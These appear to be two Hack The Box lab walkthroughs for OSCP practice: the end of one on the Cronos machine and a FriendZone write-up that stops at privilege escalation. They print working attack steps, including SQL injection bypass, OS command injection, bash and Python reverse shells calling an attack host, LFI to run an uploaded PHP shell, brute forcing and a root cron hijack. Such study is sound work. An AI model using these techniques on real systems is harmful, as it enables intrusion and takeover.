* **-oA**: output all formats and store in file _nmap/initial_

We get back the following result showing that 3 ports are open:

* **Port 80:** running Apache httpd 2.4.18
* **Port 22**: running OpenSSH 7.2p2
* **Port 53**: running ISC BIND 9.10.3-P4 \(DNS\)

![](https://miro.medium.com/max/784/1*St1x_UiegX7sCSa0P0PVKg.png)

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -O -p- -oA full 10.10.10.13
```

We get back the following result. No other ports are open.

![](https://miro.medium.com/max/785/1*9q693sxqpm-KGAHc-LTNfA.png)

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -O -p- -oA udp 10.10.10.13
```

I managed to root the box and write this blog, while this UDP scan still did not terminate. So instead I ran another UDP scan only for the top 1000 ports.

![](https://miro.medium.com/max/602/1*ugD51AwilUU6qHwQcttoRQ.png)

## Enumeration <a id="b6a0"></a>

Port 80 is open so we’ll first visit the IP address in the browser.

![](https://miro.medium.com/max/814/1*airdL9wwhDPKXP5iTeWJsQ.png)

As usual, we’ll run the general nmap vulnerability scan scripts to determine if any of the services are vulnerable.

![](https://miro.medium.com/max/694/1*Lmn4AGQ1ixJmOqEZcdKbcQ.png)

We don’t get anything useful. Next, we enumerate directories on the web server.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.13
```

![](https://miro.medium.com/max/791/1*hpYL0msU3pSNn4kbLqUW3A.png)

Another dead end. At this point, I googled “Apache2 Ubuntu Default Page” and the first entry I got was [this](https://askubuntu.com/questions/603451/why-am-i-getting-the-apache2-ubuntu-default-page-instead-of-my-own-index-html-pa). It seems that this might be a configuration issue where the IP address doesn’t know what hostname it should map to in order to serve a specific site and so instead it’s serving the Apache2 ubuntu default page.

After looking at the [documentation](https://httpd.apache.org/docs/2.4/vhosts/examples.html) for virtual host configuration in Apache, we need to perform two things.

1. Figure out the hostname\(s\) that the given IP address resolves to.
2. Add those entries in the /etc/hosts file. The documentation mentions that just because you have virtual host configuration on the Apache server does not magically cause DNS entries to be created for those host names. The hostnames need to resolve to a specific IP address and so since we’re doing this locally, we can simply add the configuration entries in the hosts file.

For the first task, we’ll use nslookup to try and figure out the domain name. After running the command, set the server to be 10.10.10.13 and then lookup the given IP address.

![](https://miro.medium.com/max/691/1*ibc-dUf0iwRDcJ5r5uwIzg.png)

We can see that this resolves to ns1.cronos.htb. This gives us a domain name of cronos.htb.

Second, as mentioned above we need to add the entry to our /etc/hosts file.

```text
10.10.10.13 cronos.htb
```

This way when you browse to cronos.htb page it resolves to 10.10.10.13 and knows which page to serve based on the virtual hosts configuration.

![](https://miro.medium.com/max/1121/1*99lU0-9r4S0tU58LzHADqA.png)

Now that we have a working domain name, let’s attempt a zone transfer to get a list of all hosts for this domain. The host command syntax for performing a zone transfer is.

```text
host -l <domain-name> <dns_server-address>
```

Therefore, to perform a zone transfer we use the following command.

```text
host -l cronos.htb 10.10.10.13
```

We get back the following result.

![](https://miro.medium.com/max/554/1*4VZzsFbgSOteZzFNoe86Zw.png)

Add the entries in your hosts file.

```text
10.10.10.13 cronos.htb www.cronos.htb admin.cronos.htb
```

Let’s visit the admin page.

![](https://miro.medium.com/max/601/1*xWbSZIFXwCVnaYkmV90RaA.png)

We’re presented with a login page. We’ll try and use that to gain an initial foothold on this box.

## Gaining an Initial Foothold <a id="e171"></a>

The first thing to try is common credentials \(admin/admin, admin/cronos, etc.\). That didn’t work and this is clearly a custom application, so we won’t find default credentials online. The next step would be to run a password cracker on it.

I’m going to use john’s password file.

```text
locate password | grep john
```

![](https://miro.medium.com/max/783/1*EcMuCm1x3DBxvSOVAJORRA.png)

Let’s see how many passwords the file contains.

```text
wc -l /usr/share/john/password.lst
```

![](https://miro.medium.com/max/668/1*4pL2fmK4aDKaUfLdUOhh3g.png)

3559 passwords is good enough. Let’s pass the file to hydra and run a brute force attack.

To do that, first intercept the request with Burp to see the form field names and the location that the request is being sent to.

![](https://miro.medium.com/max/601/1*apsjy2qJBWjtQ5b38a3Bpw.png)

Now we have all the information we need to run hydra.

```text
hydra -l 'admin' -P /usr/share/john/password.lst admin.cronos.htb http-post-form "/:username=^USER^&password=^PASS^&Login=Login:Your Login Name or Password is invalid"
```

* -l: specifies the username to be admin.
* -P: specifies the file that contains the passwords.
* http-post-form: we’re sending a POST request.
* “….”: the content in the double quotes specifies the username/password parameters to be tested and the failed login message.

If you want to see the requests that hydra is sending to confirm everything is working properly you can use the “-d” option.

**Note from the future**: Hydra \(with the above configuration\) doesn’t end up guessing any valid passwords.

While this is running, let’s try to see if the form is vulnerable to SQL injection. To do this manually, you can get any [SQL injection cheat sheet](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/) from online. After I tried a few, the following payload in the username field successfully exploited the SQL injection vulnerability.

```text
admin' #
```

This bypasses authentication and presents us with the welcome page.

![](https://miro.medium.com/max/521/1*gzjFmx6KWS_fbUYaKHDJAw.png)

Generally, you would use sqlmap to check if the application is vulnerable to SQL injection, however, since I’m working towards my OSCP and sqlmap is not allowed, I had to resort to manual means.

Regardless, if you want to perform the attack using sqlmap, first intercept the request using Burp and save it in a file \(login.txt\). Then, run sqlmap on the request.

```text
sqlmap -v 4 -r login.txt
```

I used the verbosity level 4 so that I can see the payload sqlmap uses for each request.

![](https://miro.medium.com/max/1040/1*jxxay73Vo5QZO204n3HLZw.png)

For the above payload we get a redirect to the welcome page. To test it out, go back to the browser and enter the payload in the username field. Then hit submit.

![](https://miro.medium.com/max/318/1*2Spbxzsu_cI_IiIdJrVzuw.png)

We’re presented with the login page!

![](https://miro.medium.com/max/502/1*0lUw-G6uCqlf7Mjzd0FZmA.png)

Now that we saw both the manual & automated way of exploiting SQL injections, let’s proceed with solving the box.

The commands being used on the welcome page are “traceroute” and “ping” so this specific functionality of the application clearly talks to the operating system. Let’s see if it’s vulnerable to command injection. Add the following in the input field and execute the code.

```text
8.8.8.8 & whoami
```

What the above command does is run the the preceding command \(ping 8.8.8.8\) in the background and execute the whoami command.

We get back the following result. It’s definitely vulnerable! The web server is running with the privileges of the web daemon user www-data.

![](https://miro.medium.com/max/486/1*K3dFDGqCBL3kKmpSaMs71g.png)

Since we can run arbitrary commands using this tool, let’s get it to send a reverse shell back to our attack box.

**Note**: It’s not necessary to do this using Burp.

First, intercept the request with Burp and send it to Repeater \(right click &gt; Send to Repeater\).

Go to pentestmonkey [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and grab the bash reverse shell. Change the IP address and port to those applicable to your attack machine.

```text
/bin/bash -i >& /dev/tcp/10.10.14.6/4444 0>&1
```

Highlight the entire string and click on CTRL+U to URL encode it.

![](https://miro.medium.com/max/465/1*4kzlbFV-7uYIf1JzpmDEsA.png)

Set up a listener on the attack machine.

```text
nc -nlvp 4444
```

Execute the request. It doesn’t send a reverse shell back. Check if bash is installed on the machine.

```text
which bash
```

![](https://miro.medium.com/max/919/1*5ljbBdyQo5QOKxfjBdFdnA.png)

It is so I’m not sure why this didn’t work. Let’s try python.

```text
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Again, don’t forget to URL encode it.

![](https://miro.medium.com/max/818/1*a_2rl6isI-8XzSMcf9fyFw.png)

We get back a low privileged shell!

![](https://miro.medium.com/max/667/1*HlbmfN58w08F8xgCSTlpsw.png)

Let’s upgrade it to a better shell.

```text
python -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a partially interactive bash shell. To get a fully interactive shell, background the session \(CTRL+ Z\) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```text
stty raw -echo
```

Once that is done, run the command “fg” to bring netcat back to the foreground.

Grab the user flag.

![](https://miro.medium.com/max/586/1*OprXSZljihjVu0LhZ_w28g.png)

We need to escalate privileges.

## Privilege Escalation <a id="8d94"></a>

Let’s transfer the LinEnum script from our attack machine to the target machine.

In the attack machine, start up a server in the same directory that the script resides in.

```text
python -m SimpleHTTPServer 5555
```

In the target machine, change to the /tmp directory where we have write privileges and download the LinEnum script.

```text
cd /tmp
wget http://10.10.14.6:5555/LinEnum.sh
```

Give it execute privileges.

```text
chmod +x LinEnum.sh
```

Run the script.

```text
./LinEnum.sh
```

Considering the name of the box, I’m going to focus on Crontab.

![](https://miro.medium.com/max/786/1*uEslRn_pcSHggI4NNStLag.png)

If you’re not familiar with the crontab format, here’s a quick explanation taken from this [page](https://tigr.net/3203/2014/09/13/getting-wordpress-cron-work-in-multisite-environment/).

![](https://miro.medium.com/max/525/1*sLOOxtqyH97Denfq7bWBzA.png)

We’re currently running as www-data and that user usually has full privileges on the content of the directory /var/www. Let’s confirm that.

![](https://miro.medium.com/max/630/1*aDpYm00dnTE_VuqFN_b_jQ.png)

If you’re not familiar with unix permissions, here’s a great explanation.

As we suspected, we own the file. Why is that good news for us? We own a file \(with rwx permissions\) that is running as a cron job with root privileges every minute of every hour of every month of every day of the week \(that’s what the \*\*\*\*\* means\). If we change the content of the file to send a shell back to our attack machine, the code will execute with root privileges and send us a privileged shell.

The cron job is running the file using the PHP command so whatever code we add should be in PHP. Head to [pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) and grab the PHP reverse shell file. You can either transfer it or create it directly in the directory. In my case, I decided to transfer it using a simple python server and renamed the file to artisan \(the name of file being compiled in the cron job\).

```text
cp php-reverse-shell.php artisan
```

Set up a listener to receive the reverse shell.

```text
nc -nlvp 1234
```

Wait for a minute for the scheduled cron job to run and we are root!

![](https://miro.medium.com/max/944/1*oZPZnrLRAw1SgqtH6yMAMw.png)

Grab the root flag.

![](https://miro.medium.com/max/429/1*hccgj5JudO8UViGO51QXdQ.png)

To escalate privileges in another way, transfer the linux exploit suggester script and run it on the target machine to see if your machine is vulnerable to any privilege escalation exploits.

![](https://miro.medium.com/max/557/1*aIVtIF74KtaTwtK4jYN62Q.png)

I wasn’t able to successfully exploit Dirty COW on this machine but that doesn’t mean it’s not vulnerable. It could be vulnerable to a different variant of the exploit that I tested.

## Lessons Learned <a id="26e8"></a>

To gain an initial foothold on the box we exploited three vulnerabilities.

1. The ability to perform a zone transfer which allowed us to get a list of all hosts for the domain. To prevent this vulnerability from occurring, the DNS server should be configured to only allow zone transfers from trusted IP addresses. It is worth noting that even if zone transfers are not allowed, it is still possible to enumerate the list of hosts through other \(not as easy\) means.
2. An SQL injection that allowed us to bypass authentication. To prevent this vulnerability from occurring, there are [many defenses ](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)that can be put in place, including but not limited to the use of parametrized queries.
3. An OS Command injection that allowed us to run arbitrary system commands on the box. Again, to prevent this vulnerability from occurring, there are [many defenses](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html) that can be put in place, including but not limited to the use of libraries or APIs as an alternative to calling OS commands directly.

To escalate to root privileges, we needed to exploit either of the following vulnerabilities.

1. A security misconfiguration in cron that had a scheduled cron job to run a non-privileged user owned file as root. We were able to exploit this to get a privileged reverse shell sent back to our box. To avoid this vulnerability, the cron job should have been scheduled with user privileges as apposed to root privileges.
2. Dirty COW vulnerability. This could have been avoided if the target machine was up to date on all its patches.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
friendzone-writeup-w-o-metasploit.md
# FriendZone Writeup w/o Metasploit

![](https://miro.medium.com/max/583/1*ZTQHl89ShgFw6LY7tSyHbQ.png)

## Reconnaissance <a id="991f"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA initial 10.10.10.123
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _initial_

We get back the following result showing that seven ports are open:

* **Port 21:** running ftp vsftpd 3.0.3
* **Port 22**: running OpenSSH 7.6p1 Ubuntu 4
* **Port 53:** running ISC BIND 9.11.3–1ubuntu1.2 \(DNS\)
* **Ports 80 & 443**: running Apache httpd 2.4.29
* **Ports 139 and 145:** Samba smbd 4.7.6-Ubuntu

```text
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-15 21:19 EST
Nmap scan report for 10.10.10.123
Host is up (0.030s latency).
Not shown: 993 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
...........
|_  http/1.1
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=11/15%OT=21%CT=1%CU=40251%PV=Y%DS=2%DC=I%G=Y%TM=5DCF5C
OS:FC%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=104%TI=Z%CI=I%II=I%TS=A)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)Network Distance: 2 hops
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:
|_clock-skew: mean: -48m45s, deviation: 1h09m16s, median: -8m46s
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2019-11-16T04:11:17+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-11-15 21:11:17
|_  start_date: N/AOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.10 seconds
```

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -O -p- -oA full 10.10.10.123
```

We get back the following result. No other ports are open.

```text
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-15 21:26 EST
Nmap scan report for 10.10.10.123
Host is up (0.030s latency).
Not shown: 65528 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
..........
|_  http/1.1
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=11/15%OT=21%CT=1%CU=31322%PV=Y%DS=2%DC=I%G=Y%TM=5DCF5E
OS:C4%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=102%TI=Z%CI=I%II=I%TS=A)SEQ
OS:(SP=FB%GCD=1%ISR=102%TI=Z%CI=I%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3
OS:=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=7120%W2=7
OS:120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)Network Distance: 2 hops
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:
|_clock-skew: mean: -48m45s, deviation: 1h09m16s, median: -8m46s
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2019-11-16T04:18:54+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-11-15 21:18:54
|_  start_date: N/AOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 119.93 seconds
```

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -O -p- -oA udp 10.10.10.123
```

I managed to root the box and write this blog while the UDP scan did not terminate. So instead I ran a scan for the top 1000 ports.

![](https://miro.medium.com/max/648/1*WGmxHgmxpMlcCnyiEuGqyA.png)

Two ports are open.

* **Port 53:** running DNS
* **Port 137:** running SMB

Before we move on to enumeration, let’s make a few mental notes about the nmap scan results.

1. The -sC flag checks for anonymous login when it encounters an FTP port. Since the output did not include that anonymous login is allowed, then it’s likely that we’ll need credentials to access the FTP server. Moreover, the version is 3.0.3 which does not have any critical exploits \(most FTP exploits are for version 2.x\). So FTP is very unlikely to be our point of entry.
2. Similar to FTP, there isn’t many critical exploits associated with the version of SSH that is being used, so we’ll need credentials for this service as well.
3. Port 53 is open. The first thing we need to do for this service is get the domain name through nslookup and attempt a zone transfer to enumerate name servers, hostnames, etc. The ssl-cert from the nmap scan gives us the common name friendzone.red. This could be our domain name.
4. Ports 80 and 443 show different page titles. This could be a virtual hosts routing configuration. This means that if we discover other hosts we need to enumerate them over both HTTP and HTTPS since we might get different results.
5. SMB ports are open. We need to do the usual tasks: check for anonymous login, list shares and check permissions on shares.

We have so many services to enumerate!

## Enumeration <a id="fcc2"></a>

I always start off with enumerating HTTP first. In this case both 80 and 443 are open so we’ll start there.

**Ports 80 & 443**

Visit the site on the browser.

![](https://miro.medium.com/max/906/1*j83IPksq3B3oDLuuWiZJsQ.png)

We can see the email is info@friendzoneportal.red. The friendzoneportal.red could be a possible domain name. We’ll keep it in mind when enumerating DNS.

View the source code to see if we can find any other information.

![](https://miro.medium.com/max/621/1*0U_a5hTX8_5MwY8ngAeiNA.png)

Nope. Next, run gobuster to enumerate directories.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.123
```

We get back the following result.

![](https://miro.medium.com/max/847/1*mn5ynlnQPxHI1VNXdyxZag.png)

The /wordpress directory doesn’t reference any other links. So I ran gobuster on the /wordpress directory as well and didn’t get anything useful.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.123/wordpress
```

![](https://miro.medium.com/max/845/1*VAnuv9O7eVkagpfZEkaefw.png)

Visiting the site over HTTPS \(port 443\) gives us an error.

![](https://miro.medium.com/max/542/1*E3qjmC4Nmk2HzvdYpRQ-EA.png)

Therefore, let’s move on to enumerating DNS.

**Port 53**

Try to get a domain name for the IP address using nslookup.

```text
nslookup
server 10.10.10.123
10.10.10.123
```

![](https://miro.medium.com/max/560/1*nsfeKj-Ksuf5nmlxJ5HIFw.png)

We don’t get anything. However, we do have two possible domains from previous enumeration steps:

* friendzone.red from the nmap scan, and
* friendzoneportal.red from the HTTP website

Let’s try a zone transfer on both domains.

```text
# zone transfer command: host -l <domain-name> <dns_server-address>
host -l friendzone.red 10.10.10.123 > zonetransfer.txt
host -l friendzoneportal.red 10.10.10.123 >> zonetransfer.txt
```

Open to the zonetransfer.txt file to see if we got any subdomains.

![](https://miro.medium.com/max/537/1*M0iBK8_K42JXc-SthUGNRw.png)

Add all the domains/subdomains in the /hosts/etc file.

```text
10.10.10.123 friendzone.red friendzoneportal.red admin.friendzoneportal.red files.friendzoneportal.red imports.friendzoneportal.red vpn.friendzoneportal.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red
```

Now we start visiting the subdomains we found. Remember that we have to visit them over both HTTP and HTTPS because we’re likely to get different results.

The following sites showed us particularly interesting results.

1. [https://admin.friendzoneportal.red/](https://admin.friendzoneportal.red/) and [https://administrator1.friendzone.red/](https://administrator1.friendzone.red/) have login forms.
2. [https://uploads.friendzone.red/](https://uploads.friendzone.red/) allows you to upload images.

I tried default credentials on the admin sites but that didn’t work. Before we run a password cracker on those two sites, let’s enumerate SMB. We might find credentials there.

**Ports 139 & 445**

Run smbmap to list available shares and permissions.

```text
smbmap -H 10.10.10.123
```

* **-H**: host

We get back the following result.

![](https://miro.medium.com/max/759/1*i-969O6ghR7QCC15dWjXcQ.png)

We have READ access on the general share and READ/WRITE access on the Development share. List the content of the shares.

```text
smbmap -R -H 10.10.10.123
```

* **-R:** Recursively list directories and files on all accessible shares

![](https://miro.medium.com/max/776/1*RywmWZ3WfEnP8lF_Y1aLEg.png)

The Development share does not contain anything, but the general directory has a file named creds.txt! Before we download the file, let’s use smbclient to view more information about the shares.

```text
smbclient -L //10.10.10.123
```

* **-L:** look at what services are available on a server

![](https://miro.medium.com/max/769/1*n7tSMMqQx33vfBaXTikxhw.png)

The extra information this gives us over smbmap is the Comment column. We can see that the files in the Files share are stored in /etc/Files on the system. Therefore, there’s a good possibility that the files stored in the Development share \(which we have WRITE access to\) are stored in /etc/Development. We might need this piece of information in the exploitation phase.

Let’s get the creds.txt file. First, login anonymously \(without a password\) into the general share.

```text
smbclient //10.10.10.123/general -N
```

* **-N:** suppresses the normal password prompt from the client to the user

![](https://miro.medium.com/max/704/1*nuw-IzMmv47nAw3DItODuA.png)

Download the creds.txt file from the target machine to the attack machine.

```text
get creds.txt
```

View the content of the file.

```text
cat creds.txt
```

We have admin credentials!

```text
creds for the admin THING:admin:WORKWORKHhallelujah@#
```

Try the credentials on FTP.

![](https://miro.medium.com/max/572/1*jqtQhomcwIL0veO_nPxpmQ.png)

Doesn’t work. Next, try SSH.

![](https://miro.medium.com/max/571/1*OqFTxyNrZQARfZaJYfk26Q.png)

Also doesn’t work. Next, try it on the [https://admin.friendzoneportal.red/](https://admin.friendzoneportal.red/) login form we found.

![](https://miro.medium.com/max/780/1*webImzu1uQIGjIjzHLZ6xQ.png)

Also doesn’t work. Next, try the credentials on the [https://administrator1.friendzone.red/](https://administrator1.friendzone.red/) login form.

![](https://miro.medium.com/max/600/1*icsJCIKb49A-c_rr_Y5amg.png)

We’re in! Visit the /dashboard.php page.

![](https://miro.medium.com/max/790/1*sc42Qfcz0hRKipeM3sV1Mw.png)

It seems to be a page that allows you to view images on the site. We’ll try to gain initial access through this page.

## Gaining an Initial Foothold <a id="0aa5"></a>

The dashboard.php page gives us instructions on how to view an image. We need to append the following to the URL.

```text
?image_id=a.jpg&pagename=timestamp
```

![](https://miro.medium.com/max/769/1*N_ShhPTERcBEUHo5Tj8iEg.png)

Let’s put that timestamp number in the pagename URL parameter. After we do that we no longer get a “Final Access timestamp…” message.

During our enumeration phase, we found a URL [https://uploads.friendzone.red/](https://uploads.friendzone.red/) that allows us to upload images. Let’s try and see if the images we upload there can be viewed through the dashboard page.

![](https://miro.medium.com/max/487/1*EmciZE_thgDiUaD4HL_k3w.png)

When we successfully upload the image random.jpg we get a timestamp. Let’s use the image and timestamp on the dashboard page.

```text
https://administrator1.friendzone.red/dashboard.php?image_id=random.jpg&pagename=1573957506
```

![](https://miro.medium.com/max/760/1*p7Bl3ijUqHoWAKT9YNgUaA.png)

Nope, it doesn’t find the image. Let’s move our focus to the pagename parameter. It seems to be running a timestamp script that generates a timestamp and outputs it on the page. Based on the way the application is currently working, my gut feeling is that it takes the filename “timestamp” and appends “.php” to it and then runs that script. Therefore, if this is vulnerable to LFI, it would be difficult to disclose sensitive files since the “.php” extension will get added to my query.

Instead, let’s try first uploading a php file and then exploiting the LFI vulnerability to output something on the page. During the enumeration phase, we found that we have READ and WRITE permissions on the Development share and that it’s likely that the files uploaded on that share are stored in the location /etc/Development \(based on the Comments column\).

Let’s create a simple test.php script that outputs the string “It’s working!” on the page.

```text
<?php
echo "It's working!";
?>
```

Log into the Development share.

```text
smbclient //10.10.10.123/Development -N
```

Download the test.php file from the attack machine to the share.

```text
put test.php
```

Test it on the site.

```text
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/test
```

Remember not to include the .php extension since the application already does that for you.

![](https://miro.medium.com/max/767/1*pDOjwlUQ3_JF_xKFEre1ug.png)

Perfect, it’s working! The next step is to upload a php reverse shell. Grab the reverse shell from [pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) and change the IP address and port configuration.

Upload it in the same manner as we did with the test.php file. Then setup a listener on the attack machine.

```text
nc -nlvp 1234
```

Execute the reverse shell script from the website.

```text
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/php-reverse-shell
```

We have a shell!

![](https://miro.medium.com/max/798/1*uMJNBUUfc2oz30fKGvAbtQ.png)

Let’s upgrade it to a better shell.

```text
python -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a partially interactive bash shell. To get a fully interactive shell, background the session \(CTRL+ Z\) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```text
stty raw -echo
```

Once that is done, run the command “fg” to bring netcat back to the foreground. Then use the following command to give the shell the ability to clear the screen.

```text
export TERM=xterm
```

Now that we have an interactive shell, let’s see if we have enough privileges to get the user.txt flag.

```text
cat home/friend/user.txt
```

![](https://miro.medium.com/max/566/1*daEuWO90ISC-JH32y_pLHA.png)

We need to escalate privileges to get the root flag.

## Privilege Escalation <a id="e973"></a>

